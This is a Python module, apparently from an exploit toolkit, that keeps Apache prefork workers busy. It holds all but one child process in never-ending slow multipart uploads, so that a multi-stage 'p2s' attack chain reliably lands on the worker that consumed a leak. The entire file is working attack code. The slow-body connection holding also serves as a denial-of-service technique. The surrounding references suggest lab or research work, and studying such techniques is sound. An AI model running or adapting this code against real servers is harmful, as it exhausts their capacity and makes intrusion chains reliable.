"""Apache prefork worker pinning for the p2s warning chain (docs/76 R3).

With more than one worker, Apache may hand the next request to any child, so a
chain that relies on a freshly rotated child (stage 3 must land on the same
worker that consumed the leak) becomes probabilistic.  Holding
``MaxRequestWorkers - 1`` children in a slow multipart upload leaves exactly
one free child for the chain.

This is an independent implementation of the documented behavior (AGENTS §6
#6, docs/51 §1); it does not import the lab tool.
"""
from __future__ import annotations

import socket
import threading
import time

from . import transport

CHUNK = b"P" * 8192
BOUNDARY = b"p2spin"


class WorkerPinner:
    """Hold ``count`` children open with a request body that never ends."""

    def __init__(self, endpoint: transport.Endpoint, count: int, *,
                 content_length: int = 60_000_000, interval: float = 0.5,
                 timeout: float = 10.0, settle: float = 1.2):
        self.endpoint = endpoint
        self.count = max(0, count)
        self.content_length = content_length
        self.interval = interval
        self.timeout = timeout
        self.settle = settle
        self._stop = threading.Event()
        self._socks: list[socket.socket] = []
        self._threads: list[threading.Thread] = []

    def start(self) -> "WorkerPinner":
        for _ in range(self.count):
            th = threading.Thread(target=self._hold, daemon=True)
            th.start()
            self._threads.append(th)
        if self.count:
            time.sleep(self.settle)
        return self

    def _hold(self) -> None:
        crlf = "\r\n"
        head = crlf.join([
            "POST %s HTTP/1.1" % self.endpoint.base_path,
            "Host: %s:%d" % (self.endpoint.host, self.endpoint.port),
            "Content-Type: multipart/form-data; boundary=%s"
            % BOUNDARY.decode(),
            "Content-Length: %d" % self.content_length,
            "Connection: close",
        ]) + crlf + crlf
        prefix = ("--%s%sContent-Disposition: form-data; name=\"pad\"%s%s"
                  % (BOUNDARY.decode(), crlf, crlf, crlf))
        while not self._stop.is_set():
            sock = None
            try:
                sock = socket.create_connection(
                    (self.endpoint.host, self.endpoint.port),
                    timeout=self.timeout)
                sock.settimeout(self.timeout)
                sock.sendall(head.encode("latin1") + prefix.encode("latin1"))
                self._socks.append(sock)
                while not self._stop.is_set():
                    sock.sendall(CHUNK)
                    if self._stop.wait(self.interval):
                        break
            except OSError:
                pass
            finally:
                if sock is not None:
                    try:
                        sock.close()
                    except OSError:
                        pass
            if self._stop.wait(0.2):
                break

    def stop(self) -> None:
        self._stop.set()
        for sock in self._socks:
            try:
                sock.close()
            except OSError:
                pass
        for th in self._threads:
            th.join(timeout=2)

    def __enter__(self) -> "WorkerPinner":
        return self.start()

    def __exit__(self, *exc) -> None:
        self.stop()
